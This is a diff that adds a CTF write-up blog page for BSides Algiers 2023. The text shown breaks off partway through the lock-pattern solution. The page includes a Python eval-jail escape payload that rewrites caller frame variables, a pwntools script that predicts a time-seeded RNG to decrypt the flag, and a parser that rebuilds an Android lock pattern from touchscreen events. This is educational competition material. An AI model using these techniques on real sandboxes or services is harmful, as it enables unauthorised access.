@@ -1,0 +1,520 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+        <meta content="text/html; charset=UTF-8" http-equiv="content-type"/>
+        <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+        
+        
+        
+
+        
+
+        
+
+        
+
+        
+        
+        
+
+        <title>BSides Algiers 2023</title>
+        
+        <meta name="title" content="BSides Algiers 2023">
+        
+        
+        <meta name="generator" content="Zola v0.16.1">
+
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://itskarudo.github.io/bsides-algiers-2023/">
+        <meta property="og:site_name" content="karu&#x27;s blog">
+        <meta property="og:title" content="BSides Algiers 2023">
+        
+        
+
+        
+        
+        <meta property="twitter:card" content="summary_large_image">
+        <meta property="twitter:url" content="https://itskarudo.github.io/bsides-algiers-2023/">
+        <meta property="twitter:title" content="BSides Algiers 2023">
+        
+        
+        
+        
+        <link rel="canonical" href="https://itskarudo.github.io/bsides-algiers-2023/">
+        
+        <script type="application/ld+json">
+            {
+                
+                "url":"https://itskarudo.github.io/bsides-algiers-2023/",
+                "@type":"WebSite",
+                "headline":"BSides Algiers 2023",
+                "name":"BSides Algiers 2023",
+                
+                "@context":"https://schema.org"
+            }
+        </script>
+        
+        
+        
+        <link rel="stylesheet" href="https://itskarudo.github.io/style.css"/>
+        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css" integrity="sha384-wcIxkf4k558AjM3Yz3BBFQUbk/zgIYC2R0QpeeYb+TwlBVMrlgLqwRjRtGZiK7ww" crossorigin="anonymous">
+        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js" integrity="sha384-hIoBPJpTUs74ddyc4bFZSM1TVlQDA60VBbJS0oA934VSz82sBx1X7kSx2ATBDIyd" crossorigin="anonymous"></script>
+        <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/mathtex-script-type.min.js" integrity="sha384-OGHJvxKrLNowXjZcg7A8ziPZctl4h7FncefPoKSuxgVXFxeM87GCKFJvOaTeBB9q" crossorigin="anonymous"></script>
+
+    </head>
+    <body theme="auto">
+        <article class="w">
+            <header>
+                
+                
+<h1>BSides Algiers 2023</h1>
+<p class="post-meta"><time datetime="2023-05-09">May 09, 2023</time></p>
+
+            </header>
+            <main class="page-content" aria-label="Content">
+                
+
+
+
+<p>Last weekend I took a part in the bsides algiers CTF 2023 organized by shellmates club, these are writeups for some of the challenges I solved:</p>
+<h2 id="broken-base64">Broken_Base64</h2>
+<p>no idea, used chatgpt ¯\<em>(ツ)</em>/¯</p>
+<h3 id="flag">flag</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{Y0u_h4V3_70_uNd3r5t4nD_H0w_B45364_w0Rk5}
+</span></code></pre>
+<h2 id="can-you-guess">Can you guess?</h2>
+<h3 id="recon">recon</h3>
+<p>we are given 2 python files, <code>chall.py</code> and <code>jail.py</code>:</p>
+<h3 id="chall-py"><code>chall.py</code></h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>multiprocessing </span><span style="color:#b48ead;">as </span><span>mp
+</span><span style="color:#b48ead;">from </span><span>jail </span><span style="color:#b48ead;">import </span><span>guess
+</span><span>
+</span><span style="color:#65737e;"># This is for challenge setup only
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">Welcome to the game! I give you the possibility to execute whatever you want but I dare you to guess it right...</span><span>&#39;)
+</span><span>    inp = </span><span style="color:#96b5b4;">input</span><span>(&#39;</span><span style="color:#a3be8c;">&gt;&gt; </span><span>&#39;)
+</span><span>    guessed = mp.</span><span style="color:#bf616a;">Value</span><span>(&#39;</span><span style="color:#a3be8c;">b</span><span>&#39;, </span><span style="color:#d08770;">False</span><span>)
+</span><span>
+</span><span>
+</span><span>    child_proc = mp.</span><span style="color:#bf616a;">Process</span><span>(</span><span style="color:#bf616a;">target</span><span>=guess, </span><span style="color:#bf616a;">args</span><span>=(inp,guessed,))
+</span><span>    child_proc.</span><span style="color:#bf616a;">start</span><span>()
+</span><span>
+</span><span>    child_proc.</span><span style="color:#bf616a;">join</span><span>(</span><span style="color:#bf616a;">timeout</span><span>=</span><span style="color:#d08770;">3600</span><span>)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">if </span><span>guessed.value == </span><span style="color:#d08770;">True</span><span>:
+</span><span>        </span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span>(&#39;</span><span style="color:#a3be8c;">flag.txt</span><span>&#39;) </span><span style="color:#b48ead;">as </span><span>f:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(f.</span><span style="color:#bf616a;">read</span><span>())
+</span><span>    </span><span style="color:#b48ead;">else</span><span>:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Told you, no flags will be given for you</span><span>&quot;)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">if </span><span>child_proc.exitcode is </span><span style="color:#d08770;">None</span><span>:
+</span><span>        child_proc.</span><span style="color:#bf616a;">terminate</span><span>()
+</span><span>
+</span></code></pre>
+<h3 id="jail-py"><code>jail.py</code></h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">jail</span><span>(</span><span style="color:#bf616a;">inp</span><span>):
+</span><span>    </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">eval</span><span>(inp)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">guess</span><span>(</span><span style="color:#bf616a;">inp</span><span>, </span><span style="color:#bf616a;">guessed</span><span>):
+</span><span>    </span><span style="color:#b48ead;">import </span><span>os, random
+</span><span>
+</span><span>    os.</span><span style="color:#bf616a;">setregid</span><span>(</span><span style="color:#d08770;">65534</span><span>, </span><span style="color:#d08770;">65534</span><span>), os.</span><span style="color:#bf616a;">setreuid</span><span>(</span><span style="color:#d08770;">65534</span><span>, </span><span style="color:#d08770;">65534</span><span>)
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        r = </span><span style="color:#bf616a;">jail</span><span>(inp)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>random.</span><span style="color:#bf616a;">random</span><span>() == r:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(&#39;</span><span style="color:#a3be8c;">That</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">s right, but you ain</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">t get any flags</span><span>&#39;)
+</span><span>            guessed.value = </span><span style="color:#d08770;">False
+</span><span>    </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">Don&#39;t break my jail</span><span>&quot;)
+</span><span>
+</span></code></pre>
+<p>basically what's going on here is, <code>chall.py</code> is allocating a shared memory region called <code>guessed</code>, reads user input into <code>inp</code> and calls <code>jail.guess()</code> from <code>jail.py</code>, which calls <code>jail(inp)</code> and evaluates the user input, after that it checks if the result equals a random number chosen, if so it sets <code>guessed.value</code> to <code>False</code>.</p>
+<p>notice that the only way to read the flag is if <code>guessed.value == True</code>, which is never the case, so we need to find a way to override it.</p>
+<h3 id="the-call-stack">the call stack</h3>
+<p>at this point I started looking into ways to traverse the call stack frames, this way I can access the <code>guess()</code> frame (parent) from the <code>jail()</code> frame (where we're currently at), and I came across the <a href="https://docs.python.org/3/library/inspect.html"><code>inspect</code></a> module in python.</p>
+<h3 id="dirty-python-tricks">dirty python tricks</h3>
+<p>since we're in an <code>eval</code> and not an <code>exec</code>, we can't just import stuff the python way (<code>import os</code>), nor can we set attributes the usual way <code>foo.bar = 5</code>, we would have to use some tricks such as <code>__import__('os')</code> and <code>setattr(foo, &quot;bar&quot;, 5)</code>.</p>
+<h3 id="final-exploit">final exploit</h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#96b5b4;">setattr</span><span>(</span><span style="color:#96b5b4;">__import__</span><span>(&#39;</span><span style="color:#a3be8c;">inspect</span><span>&#39;).</span><span style="color:#bf616a;">getargvalues</span><span>(</span><span style="color:#96b5b4;">__import__</span><span>(&#39;</span><span style="color:#a3be8c;">inspect</span><span>&#39;).</span><span style="color:#bf616a;">currentframe</span><span>().f_back.f_back).locals[&#39;</span><span style="color:#a3be8c;">guessed</span><span>&#39;], &quot;</span><span style="color:#a3be8c;">value</span><span>&quot;, </span><span style="color:#d08770;">True</span><span>)
+</span></code></pre>
+<h3 id="flag-1">flag</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{PYTHOn_FR4mE_0bj3cTs_ARENT_s3CuR3_ARE_Th3y}
+</span></code></pre>
+<h2 id="srng">SRNG</h2>
+<h3 id="recon-1">recon</h3>
+<p>we are given a single python script:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python
+</span><span style="color:#b48ead;">from </span><span>flag </span><span style="color:#b48ead;">import </span><span style="color:#bf616a;">FLAG
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Spooder</span><span style="color:#eff1f5;">:
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#96b5b4;">__init__</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>         </span><span style="color:#bf616a;">self</span><span>.rand, </span><span style="color:#bf616a;">self</span><span>.i = </span><span style="color:#bf616a;">int</span><span>(time.</span><span style="color:#bf616a;">time</span><span>()), </span><span style="color:#d08770;">2
+</span><span>         </span><span style="color:#bf616a;">self</span><span>.</span><span style="color:#bf616a;">generate_random</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">generate_random</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">m</span><span>: int = </span><span style="color:#d08770;">0x10ffff</span><span>) -&gt; int:
+</span><span>        </span><span style="color:#bf616a;">self</span><span>.rand = </span><span style="color:#96b5b4;">pow</span><span>(</span><span style="color:#bf616a;">self</span><span>.i, </span><span style="color:#bf616a;">self</span><span>.rand, m)
+</span><span>        </span><span style="color:#bf616a;">self</span><span>.i = </span><span style="color:#bf616a;">self</span><span>.i + </span><span style="color:#d08770;">1
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span>.rand
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">generate_padding</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">l</span><span>: int = </span><span style="color:#d08770;">0x101</span><span>) -&gt; str:
+</span><span>        padding = &#39;&#39;
+</span><span>        </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#bf616a;">self</span><span>.</span><span style="color:#bf616a;">generate_random</span><span>(l)):
+</span><span>            padding += </span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#bf616a;">self</span><span>.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">0xd7fb</span><span>))
+</span><span>        </span><span style="color:#b48ead;">return </span><span>padding
+</span><span>
+</span><span>spooder = </span><span style="color:#bf616a;">Spooder</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">spooder_encryption</span><span>(</span><span style="color:#bf616a;">message</span><span>: str) -&gt; str:
+</span><span>    pad = spooder.</span><span style="color:#bf616a;">generate_padding</span><span>()
+</span><span>    message = &#39;&#39;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(c) ^ spooder.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">0xd7fb</span><span>)) </span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span>message])
+</span><span>    cipher = pad + message
+</span><span>    </span><span style="color:#b48ead;">return </span><span>cipher
+</span><span>
+</span><span style="color:#b48ead;">if </span><span>__name__ == &#39;</span><span style="color:#a3be8c;">__main__</span><span>&#39;:
+</span><span>
+</span><span>    welcome = </span><span style="color:#b48ead;">f</span><span>&#39;&#39;&#39;
+</span><span style="color:#a3be8c;">               ▗▄▖ ▗▄▄▖ ▗▄ ▗▖  ▄▄
+</span><span style="color:#a3be8c;">              ▗▛▀▜ ▐▛▀▜▌▐█ ▐▌ █▀▀▌
+</span><span style="color:#a3be8c;">              ▐▙   ▐▌ ▐▌▐▛▌▐▌▐▌
+</span><span style="color:#a3be8c;">               ▜█▙ ▐███ ▐▌█▐▌▐▌▗▄▖
+</span><span style="color:#a3be8c;">                 ▜▌▐▌▝█▖▐▌▐▟▌▐▌▝▜▌
+</span><span style="color:#a3be8c;">              ▐▄▄▟▘▐▌ ▐▌▐▌ █▌ █▄▟▌
+</span><span style="color:#a3be8c;">               ▀▀▘ ▝▘ ▝▀▝▘ ▀▘  ▀▀
+</span><span style="color:#a3be8c;">    </span><span style="color:#96b5b4;">\n
+</span><span style="color:#a3be8c;">    This is not the RNG the world wants, and it&#39;s not the RNG the world need, but this is the RNG that the world gets.
+</span><span style="color:#a3be8c;">    Welcome to the Spooder Random Number Generator, or special random number generator.
+</span><span style="color:#a3be8c;">    It can generate random numbers like this: </span><span>{&#39;</span><span style="color:#a3be8c;">, </span><span>&#39;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#bf616a;">str</span><span>(spooder.</span><span style="color:#bf616a;">generate_random</span><span>()) </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(spooder.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">121</span><span>))])}</span><span style="color:#a3be8c;">.
+</span><span style="color:#a3be8c;">    It can also generate random strings like this: </span><span>{spooder.</span><span style="color:#bf616a;">generate_padding</span><span>(</span><span style="color:#d08770;">53</span><span>)}</span><span style="color:#a3be8c;">.
+</span><span style="color:#a3be8c;">    You can also use it to encrypt secrets like this: </span><span>{</span><span style="color:#bf616a;">spooder_encryption</span><span>(</span><span style="color:#bf616a;">FLAG</span><span>).</span><span style="color:#bf616a;">encode</span><span>().</span><span style="color:#bf616a;">hex</span><span>()}</span><span style="color:#a3be8c;">.
+</span><span style="color:#a3be8c;">    Here is a free trial:
+</span><span style="color:#a3be8c;">    1. Generate random string.
+</span><span style="color:#a3be8c;">    2. Generate random number.
+</span><span style="color:#a3be8c;">    3. Encrypt.
+</span><span style="color:#a3be8c;">    </span><span>&#39;&#39;&#39;
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(welcome)
+</span><span>    tries = spooder.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">7</span><span>)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">You have </span><span>{tries}</span><span style="color:#a3be8c;"> tries .</span><span>&#39;)
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">reversed</span><span>(</span><span style="color:#96b5b4;">range</span><span>(tries)):
+</span><span>        choice = </span><span style="color:#96b5b4;">input</span><span>(&#39;</span><span style="color:#a3be8c;">Choose wisely:</span><span style="color:#96b5b4;">\n\t</span><span style="color:#a3be8c;">&gt; </span><span>&#39;)
+</span><span>        </span><span style="color:#b48ead;">if </span><span>choice == &#39;</span><span style="color:#a3be8c;">1</span><span>&#39;:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(spooder.</span><span style="color:#bf616a;">generate_padding</span><span>(</span><span style="color:#d08770;">11</span><span>))
+</span><span>        </span><span style="color:#b48ead;">elif </span><span>choice == &#39;</span><span style="color:#a3be8c;">2</span><span>&#39;:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(spooder.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">101</span><span>))
+</span><span>        </span><span style="color:#b48ead;">elif </span><span>choice == &#39;</span><span style="color:#a3be8c;">3</span><span>&#39;:
+</span><span>            </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">spooder_encryption</span><span>(</span><span style="color:#96b5b4;">input</span><span>(&#39;</span><span style="color:#a3be8c;">what do you want to encrypt?</span><span style="color:#96b5b4;">\n\t</span><span style="color:#a3be8c;">&gt; </span><span>&#39;)))
+</span><span>        </span><span style="color:#b48ead;">else</span><span>:
+</span><span>            </span><span style="color:#bf616a;">exit</span><span>(</span><span style="color:#d08770;">0</span><span>)
+</span><span>
+</span></code></pre>
+<p><strong>TL;DR</strong>:
+the script gets the current time (<code>time.time()</code>) and uses it to generate &quot;&quot;&quot;random&quot;&quot;&quot; numbers which can easily be predicted.</p>
+<h3 id="final-exploit-1">final exploit</h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>time
+</span><span>
+</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">Spooder</span><span style="color:#eff1f5;">:
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#96b5b4;">__init__</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>         </span><span style="color:#bf616a;">self</span><span>.rand, </span><span style="color:#bf616a;">self</span><span>.i = </span><span style="color:#bf616a;">int</span><span>(time.</span><span style="color:#bf616a;">time</span><span>()), </span><span style="color:#d08770;">2
+</span><span>         </span><span style="color:#bf616a;">self</span><span>.</span><span style="color:#bf616a;">generate_random</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">generate_random</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">m</span><span>: int = </span><span style="color:#d08770;">0x10ffff</span><span>) -&gt; int:
+</span><span>        </span><span style="color:#bf616a;">self</span><span>.rand = </span><span style="color:#96b5b4;">pow</span><span>(</span><span style="color:#bf616a;">self</span><span>.i, </span><span style="color:#bf616a;">self</span><span>.rand, m)
+</span><span>        </span><span style="color:#bf616a;">self</span><span>.i = </span><span style="color:#bf616a;">self</span><span>.i + </span><span style="color:#d08770;">1
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">self</span><span>.rand
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">generate_padding</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">l</span><span>: int = </span><span style="color:#d08770;">0x101</span><span>) -&gt; str:
+</span><span>        padding = &#39;&#39;
+</span><span>        </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#bf616a;">self</span><span>.</span><span style="color:#bf616a;">generate_random</span><span>(l)):
+</span><span>            padding += </span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#bf616a;">self</span><span>.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">0xd7fb</span><span>))
+</span><span>        </span><span style="color:#b48ead;">return </span><span>padding
+</span><span>
+</span><span>s = </span><span style="color:#bf616a;">Spooder</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">spooder_encryption</span><span>(</span><span style="color:#bf616a;">message</span><span>: str) -&gt; str:
+</span><span>    pad = s.</span><span style="color:#bf616a;">generate_padding</span><span>()
+</span><span>    message = &#39;&#39;.</span><span style="color:#bf616a;">join</span><span>([</span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(c) ^ s.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">0xd7fb</span><span>)) </span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span>message])
+</span><span>    cipher = pad + message
+</span><span>    </span><span style="color:#b48ead;">return </span><span>cipher
+</span><span>
+</span><span>
+</span><span>n = [</span><span style="color:#bf616a;">str</span><span>(s.</span><span style="color:#bf616a;">generate_random</span><span>()) </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(s.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">121</span><span>))]
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">srng.bsides.shellmates.club</span><span>&quot;, </span><span style="color:#d08770;">443</span><span>, </span><span style="color:#bf616a;">ssl</span><span>=</span><span style="color:#d08770;">True</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">this: </span><span>&#39;)
+</span><span>nums = p.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">decode</span><span>().</span><span style="color:#bf616a;">strip</span><span>().</span><span style="color:#bf616a;">split</span><span>(&#39;</span><span style="color:#a3be8c;">, </span><span>&#39;)
+</span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span>(nums) == </span><span style="color:#96b5b4;">len</span><span>(n)
+</span><span>nums[-</span><span style="color:#d08770;">1</span><span>] = nums[-</span><span style="color:#d08770;">1</span><span>][:-</span><span style="color:#d08770;">1</span><span>]
+</span><span>
+</span><span style="color:#b48ead;">for </span><span>a, b </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">zip</span><span>(nums, n):
+</span><span>    </span><span style="color:#b48ead;">assert </span><span>a == b
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">this: </span><span>&#39;)
+</span><span>s.</span><span style="color:#bf616a;">generate_padding</span><span>(</span><span style="color:#d08770;">53</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">this: </span><span>&#39;)
+</span><span>pad = s.</span><span style="color:#bf616a;">generate_padding</span><span>()
+</span><span>bruh = bytes.</span><span style="color:#bf616a;">fromhex</span><span>(p.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">strip</span><span>()[:-</span><span style="color:#d08770;">1</span><span>].</span><span style="color:#bf616a;">decode</span><span>()).</span><span style="color:#bf616a;">decode</span><span>()
+</span><span>
+</span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span>bruh[</span><span style="color:#96b5b4;">len</span><span>(pad):]:
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#96b5b4;">chr</span><span>(</span><span style="color:#96b5b4;">ord</span><span>(c) ^ s.</span><span style="color:#bf616a;">generate_random</span><span>(</span><span style="color:#d08770;">0xd7fb</span><span>)), </span><span style="color:#bf616a;">end</span><span>=&quot;&quot;)
+</span><span>
+</span></code></pre>
+<h3 id="flag-2">flag</h3>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>shellmates{5p00d3R_Fl4g_f0r_sPooDeR_cH4lL3nge}
+</span></code></pre>
+<h2 id="lock-pattern">lock pattern</h2>
+<h3 id="recon-2">recon</h3>
+<p>we are given 2 files, <code>assignment.md</code> which explains how we obtained the second file <code>event2</code> and asked to recover the lock screen pattern</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">adb</span><span> shell getevent | </span><span style="color:#bf616a;">grep </span><span>&quot;</span><span style="color:#a3be8c;">touchscreen</span><span>&quot;</span><span style="color:#bf616a;"> -A</span><span> 1
+</span><span style="color:#bf616a;">adb</span><span> shell cat /dev/input/event2 &gt; evtx
+</span><span style="color:#bf616a;">md5sum</span><span> event2
+</span><span style="color:#65737e;">#f241a508d5fccea7eb0f33a839a9633f
+</span></code></pre>
+<p>basically, we're getting the content of the touchscreen <a href="https://www.kernel.org/doc/Documentation/input/input.txt">input event</a> from an android phone.</p>
+<p>looking through documentation, we can see that <code>event2</code> is a binary file with a list of structures describing events, each event follows the following structure:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">struct </span><span>input_event {
+</span><span>	</span><span style="color:#b48ead;">struct</span><span> timeval time;
+</span><span>	</span><span style="color:#b48ead;">unsigned short</span><span> type;
+</span><span>	</span><span style="color:#b48ead;">unsigned short</span><span> code;
+</span><span>	</span><span style="color:#b48ead;">unsigned int</span><span> value;
+</span><span>};
+</span></code></pre>
+<p>since we're interested in the finger position on the screen we only want events with type <code>EV_ABS (0x03)</code> and codes <code>ABS_MT_POSITION_X (0x35)</code> and <code>ABS_MT_POSITION_Y (0x36)</code>.</p>
+<p>at this point it's trivial to parse the <code>event2</code> file, extract the <code>(x, y)</code> positions and plot them to get the lock.</p>
+<h3 id="final-exploit-2">final exploit</h3>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span>numpy </span><span style="color:#b48ead;">as </span><span>np
+</span><span style="color:#b48ead;">import </span><span>matplotlib.pyplot </span><span style="color:#b48ead;">as </span><span>plt
+</span><span style="color:#b48ead;">from </span><span>matplotlib.animation </span><span style="color:#b48ead;">import </span><span>FuncAnimation
+</span><span style="color:#b48ead;">import </span><span>struct
+</span><span>
+</span><span>f = </span><span style="color:#96b5b4;">open</span><span>(&quot;</span><span style="color:#a3be8c;">./event2</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">rb</span><span>&quot;)
+</span><span>
+</span><span>coords = []
+</span><span>saved_x = </span><span style="color:#d08770;">0
+</span><span>saved_y = </span><span style="color:#d08770;">0
+</span><span>
+</span><span style="color:#b48ead;">while </span><span style="color:#d08770;">True</span><span>:
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        time = f.</span><span style="color:#bf616a;">read</span><span>(</span><span style="color:#d08770;">4</span><span>)
+</span><span>        f.</span><span style="color:#bf616a;">read</span><span>(</span><span style="color:#d08770;">4</span><span>)
+</span><span>        ty = struct.</span><span style="color:#bf616a;">unpack</span><span>(&#39;</span><span style="color:#a3be8c;">&lt;H</span><span>&#39;, f.</span><span style="color:#bf616a;">read</span><span>(</span><span style="color:#d08770;">2</span><span>))[</span><span style="color:#d08770;">0</span><span>]
+</span><span>        code = struct.</span><span style="color:#bf616a;">unpack</span><span>(&#39;</span><span style="color:#a3be8c;">&lt;H</span><span>&#39;, f.</span><span style="color:#bf616a;">read</span><span>(</span><span style="color:#d08770;">2</span><span>))[</span><span style="color:#d08770;">0</span><span>]
+</span><span>        value = struct.</span><span style="color:#bf616a;">unpack</span><span>(&#39;</span><span style="color:#a3be8c;">&lt;I</span><span>&#39;, f.</span><span style="color:#bf616a;">read</span><span>(</span><span style="color:#d08770;">4</span><span>))[</span><span style="color:#d08770;">0</span><span>]
+</span><span>        </span><span style="color:#b48ead;">if </span><span>ty == </span><span style="color:#d08770;">3</span><span>:
+</span><span>            </span><span style="color:#b48ead;">if </span><span>code == </span><span style="color:#d08770;">0x35</span><span>:
+</span><span>                saved_x = value
+</span><span>                coords.</span><span style="color:#bf616a;">append</span><span>((saved_x, saved_y))
+</span><span>            </span><span style="color:#b48ead;">elif </span><span>code == </span><span style="color:#d08770;">0x36</span><span>:
+</span><span>                saved_y = -value
+</span><span>                coords.</span><span style="color:#bf616a;">append</span><span>((saved_x, saved_y))
+</span><span>    </span><span style="color:#b48ead;">except </span><span>Exception:
+</span><span>        </span><span style="color:#b48ead;">break
+</span><span>
+</span><span>
+</span><span>fig, ax = plt.</span><span style="color:#bf616a;">subplots</span><span>()
+</span><span>ax.</span><span style="color:#bf616a;">set_xlim</span><span>(</span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">2000</span><span>)
+</span><span>ax.</span><span style="color:#bf616a;">set_ylim</span><span>(-</span><span style="color:#d08770;">2000</span><span>, </span><span style="color:#d08770;">0</span><span>)
+</span><span>point, = ax.</span><span style="color:#bf616a;">plot</span><span>([], [], &#39;</span><span style="color:#a3be8c;">ro</span><span>&#39;)
+</span><span>line, = ax.</span><span style="color:#bf616a;">plot</span><span>([], [], &#39;</span><span style="color:#a3be8c;">ro</span><span>&#39;)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">update</span><span>(</span><span style="color:#bf616a;">frame</span><span>):
+</span><span>    x, y = coords[frame]
+</span><span>    point.</span><span style="color:#bf616a;">set_data</span><span>([x], [y])
